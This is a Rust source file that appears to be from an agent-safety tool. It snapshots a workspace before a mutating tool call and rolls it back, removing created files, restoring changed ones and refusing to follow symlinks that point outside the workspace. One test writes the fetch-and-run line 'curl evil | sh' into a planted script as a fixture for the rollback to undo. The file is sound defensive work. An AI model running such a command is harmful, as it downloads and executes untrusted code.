//! Snapshot local state before a mutating tool call, and roll back if it goes
//! wrong.
//!
//! # Why this exists
//!
//! A tool that writes files is the one you cannot undo by refusing after the
//! fact. By the time a bad result comes back — a prompt injection that talked
//! an agent into rewriting a config, a tool that half-finished and left the
//! tree inconsistent — the damage is on disk. The only way to make a mutating
//! call reversible is to have captured the state before it ran.
//!
//! # Design decision: copy-based, bounded, and honest about it
//!
//! This is not a filesystem snapshot. There is no CoW, no LVM, no btrfs
//! subvolume. It reads the files under a workspace into memory and writes them
//! back on rollback. That is the right trade for an agent workspace of a few
//! thousand small files, and completely wrong for a large tree — so the limits
//! are explicit and exceeding them is an error rather than a silent partial
//! capture. A snapshot that quietly covered only half the tree would be worse
//! than none, because the rollback would appear to succeed.
//!
//! # Design decision: capture presence, not just content
//!
//! Rollback has to delete files the call *created*, not merely restore the ones
//! it changed. Recording only content would leave new files behind — and a
//! half-rolled-back tree is its own kind of corruption. So the snapshot records
//! the exact set of paths, and restore removes anything that appeared since.
//!
//! # Known limitation, stated plainly
//!
//! Permissions, ownership, symlink structure and empty directories are not
//! restored, and mid-restore failure is reported but not itself transactional.
//! Rollback returns the *contents* of a workspace, which is what an agent
//! actually mutates. Anything relying on file modes needs a real filesystem
//! snapshot underneath.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};
use walkdir::WalkDir;

use crate::error::{GritError, Result};

/// Bounds on what may be captured. Exceeding either is an error.
#[derive(Debug, Clone, Copy)]
pub struct Limits {
    pub max_files: usize,
    pub max_total_bytes: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_files: 5_000,
            max_total_bytes: 64 * 1024 * 1024,
        }
    }
}

#[derive(Debug, Clone)]
struct Entry {
    contents: Vec<u8>,
    digest: [u8; 32],
}

#[derive(Debug)]
pub struct Snapshot {
    root: PathBuf,
    entries: BTreeMap<PathBuf, Entry>,
    total_bytes: usize,
}

fn digest_of(bytes: &[u8]) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hasher.finalize().into()
}

impl Snapshot {
    /// Capture every regular file beneath `root`.
    ///
    /// Symlinks are recorded by the content they point at only if that target
    /// is itself inside the root; links pointing outside are skipped rather
    /// than followed, so a snapshot can never pull in — or later write back
    /// over — a file outside the workspace.
    pub fn capture(root: &Path, limits: Limits) -> Result<Self> {
        let root = root.canonicalize().map_err(|e| GritError::io(root, e))?;

        let mut entries = BTreeMap::new();
        let mut total_bytes = 0usize;

        for entry in WalkDir::new(&root).follow_links(false) {
            let entry = entry
                .map_err(|e| GritError::Snapshot(format!("walking {}: {e}", root.display())))?;
            let path = entry.path();

            let meta = entry
                .metadata()
                .map_err(|e| GritError::Snapshot(format!("stat {}: {e}", path.display())))?;
            if !meta.is_file() {
                continue;
            }

            // A symlink whose target escapes the root is skipped entirely.
            // Following it would copy outside data in, and restoring it would
            // write outside data back — turning a rollback into an exfiltration
            // and an overwrite at once.
            if entry.path_is_symlink() {
                match path.canonicalize() {
                    Ok(real) if crate::containment::contains(&root, &real) => {}
                    _ => continue,
                }
            }

            let contents = std::fs::read(path).map_err(|e| GritError::io(path, e))?;
            total_bytes = total_bytes.saturating_add(contents.len());

            if entries.len() + 1 > limits.max_files {
                return Err(GritError::Snapshot(format!(
                    "workspace has more than {} files; refusing to capture a \
                     partial snapshot, because a rollback from one would look \
                     like it worked",
                    limits.max_files
                )));
            }
            if total_bytes > limits.max_total_bytes {
                return Err(GritError::Snapshot(format!(
                    "workspace exceeds {} bytes; refusing to capture a partial \
                     snapshot",
                    limits.max_total_bytes
                )));
            }

            let digest = digest_of(&contents);
            entries.insert(path.to_path_buf(), Entry { contents, digest });
        }

        Ok(Self {
            root,
            entries,
            total_bytes,
        })
    }

    pub fn file_count(&self) -> usize {
        self.entries.len()
    }

    pub fn total_bytes(&self) -> usize {
        self.total_bytes
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Paths that differ from the snapshot right now: changed, created or
    /// deleted. Used to report what a call actually touched, which is the
    /// figure worth putting in an audit log — "the tool said it edited one
    /// file and in fact wrote nine" is exactly what you want to be able to see.
    pub fn drift(&self) -> Result<Drift> {
        let mut changed = Vec::new();
        let mut created = Vec::new();
        let mut deleted = Vec::new();

        let mut seen = BTreeMap::new();
        for entry in WalkDir::new(&self.root).follow_links(false) {
            let entry =
                entry.map_err(|e| GritError::Snapshot(format!("walking for drift: {e}")))?;
            let path = entry.path();
            let is_file = entry.metadata().map(|m| m.is_file()).unwrap_or(false);
            if !is_file {
                continue;
            }
            let contents = std::fs::read(path).map_err(|e| GritError::io(path, e))?;
            seen.insert(path.to_path_buf(), digest_of(&contents));
        }

        for (path, digest) in &seen {
            match self.entries.get(path) {
                None => created.push(path.clone()),
                Some(before) if &before.digest != digest => changed.push(path.clone()),
                Some(_) => {}
            }
        }
        for path in self.entries.keys() {
            if !seen.contains_key(path) {
                deleted.push(path.clone());
            }
        }

        Ok(Drift {
            changed,
            created,
            deleted,
        })
    }

    /// Put the workspace back exactly as it was: restore changed and deleted
    /// files, and remove anything created since.
    ///
    /// Returns the drift that was undone. Errors are collected rather than
    /// returned on the first failure — abandoning a rollback halfway leaves the
    /// tree in a third state that matches neither before nor after, which is
    /// the worst of the three.
    pub fn restore(&self) -> Result<Drift> {
        let drift = self.drift()?;
        let mut failures: Vec<String> = Vec::new();

        for path in drift.created.iter() {
            if let Err(e) = std::fs::remove_file(path) {
                failures.push(format!("remove {}: {e}", path.display()));
            }
        }

        for path in drift.changed.iter().chain(drift.deleted.iter()) {
            let Some(entry) = self.entries.get(path) else {
                continue;
            };
            if let Some(parent) = path.parent() {
                if let Err(e) = std::fs::create_dir_all(parent) {
                    failures.push(format!("recreate {}: {e}", parent.display()));
                    continue;
                }
            }
            if let Err(e) = std::fs::write(path, &entry.contents) {
                failures.push(format!("restore {}: {e}", path.display()));
            }
        }

        if !failures.is_empty() {
            return Err(GritError::Snapshot(format!(
                "rollback incomplete ({} of {} operations failed): {}",
                failures.len(),
                drift.total(),
                failures.join("; ")
            )));
        }

        Ok(drift)
    }
}

#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Drift {
    pub changed: Vec<PathBuf>,
    pub created: Vec<PathBuf>,
    pub deleted: Vec<PathBuf>,
}

impl Drift {
    pub fn total(&self) -> usize {
        self.changed.len() + self.created.len() + self.deleted.len()
    }
    pub fn is_empty(&self) -> bool {
        self.total() == 0
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn workspace() -> tempfile::TempDir {
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(dir.path().join("a.txt"), b"original a").expect("write");
        fs::create_dir_all(dir.path().join("sub")).expect("mkdir");
        fs::write(dir.path().join("sub/b.txt"), b"original b").expect("write");
        dir
    }

    #[test]
    fn a_clean_workspace_shows_no_drift() {
        let dir = workspace();
        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        assert_eq!(snap.file_count(), 2);
        assert!(snap.drift().expect("drift").is_empty());
    }

    #[test]
    fn a_modified_file_is_restored() {
        let dir = workspace();
        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        fs::write(dir.path().join("a.txt"), b"CORRUPTED").expect("write");

        let drift = snap.drift().expect("drift");
        assert_eq!(drift.changed.len(), 1, "{drift:?}");

        snap.restore().expect("restore");
        let after = fs::read(dir.path().join("a.txt")).expect("read");
        assert_eq!(after, b"original a");
        assert!(snap.drift().expect("drift").is_empty());
    }

    #[test]
    fn a_created_file_is_removed() {
        // The case content-only snapshotting silently misses.
        let dir = workspace();
        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        fs::write(dir.path().join("sub/planted.sh"), b"curl evil | sh").expect("write");

        assert_eq!(snap.drift().expect("drift").created.len(), 1);
        snap.restore().expect("restore");
        assert!(!dir.path().join("sub/planted.sh").exists());
        assert!(snap.drift().expect("drift").is_empty());
    }

    #[test]
    fn a_deleted_file_is_brought_back() {
        let dir = workspace();
        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        fs::remove_file(dir.path().join("sub/b.txt")).expect("remove");

        assert_eq!(snap.drift().expect("drift").deleted.len(), 1);
        snap.restore().expect("restore");
        assert_eq!(
            fs::read(dir.path().join("sub/b.txt")).expect("read"),
            b"original b"
        );
    }

    #[test]
    fn a_deleted_file_in_a_deleted_directory_is_brought_back() {
        let dir = workspace();
        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        fs::remove_dir_all(dir.path().join("sub")).expect("rmdir");
        snap.restore().expect("restore");
        assert_eq!(
            fs::read(dir.path().join("sub/b.txt")).expect("read"),
            b"original b"
        );
    }

    #[test]
    fn all_three_kinds_of_damage_are_undone_together() {
        let dir = workspace();
        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        fs::write(dir.path().join("a.txt"), b"changed").expect("write");
        fs::write(dir.path().join("new.txt"), b"created").expect("write");
        fs::remove_file(dir.path().join("sub/b.txt")).expect("remove");

        let drift = snap.restore().expect("restore");
        assert_eq!(drift.changed.len(), 1);
        assert_eq!(drift.created.len(), 1);
        assert_eq!(drift.deleted.len(), 1);
        assert!(
            snap.drift().expect("drift").is_empty(),
            "workspace not clean"
        );
    }

    #[test]
    fn a_workspace_over_the_file_limit_is_refused_outright() {
        // A partial snapshot is worse than none: the rollback would look like
        // it worked.
        let dir = workspace();
        let limits = Limits {
            max_files: 1,
            max_total_bytes: usize::MAX,
        };
        let err = Snapshot::capture(dir.path(), limits).expect_err("must refuse");
        assert_eq!(err.code(), "snapshot_error");
    }

    #[test]
    fn a_workspace_over_the_byte_limit_is_refused_outright() {
        let dir = workspace();
        let limits = Limits {
            max_files: usize::MAX,
            max_total_bytes: 4,
        };
        assert!(Snapshot::capture(dir.path(), limits).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn a_symlink_out_of_the_workspace_is_not_captured() {
        // Capturing it would copy outside data in; restoring it would write
        // outside data back.
        let outside = tempfile::tempdir().expect("tempdir");
        fs::write(outside.path().join("secret"), b"do not touch").expect("write");

        let dir = workspace();
        std::os::unix::fs::symlink(outside.path().join("secret"), dir.path().join("link"))
            .expect("symlink");

        let snap = Snapshot::capture(dir.path(), Limits::default()).expect("capture");
        assert_eq!(snap.file_count(), 2, "the symlink must not be captured");
    }
}
